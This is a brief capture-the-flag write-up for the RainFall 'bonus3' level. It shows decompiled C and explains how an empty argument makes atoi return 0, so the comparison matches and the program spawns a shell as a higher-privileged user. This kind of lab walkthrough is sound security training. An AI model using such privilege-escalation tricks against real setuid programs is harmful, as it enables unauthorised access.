# Solution

there is two important line in the program 
```c
 if ( !strcmp(v4, argv[1]) )
    execl("/bin/sh", "sh", 0);
```

we need the buffer and our input to be the same
the only way we can modifie the buffer is with this line

```c
v4[atoi(argv[1])] = 0;
```

man atoi:
RETURN VALUE
       The converted value or 0 on error.
if argv[1] is empty/NULL we will have v4[0] = 0 and therefore having argv[1] == v4

end :

```sh
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
```
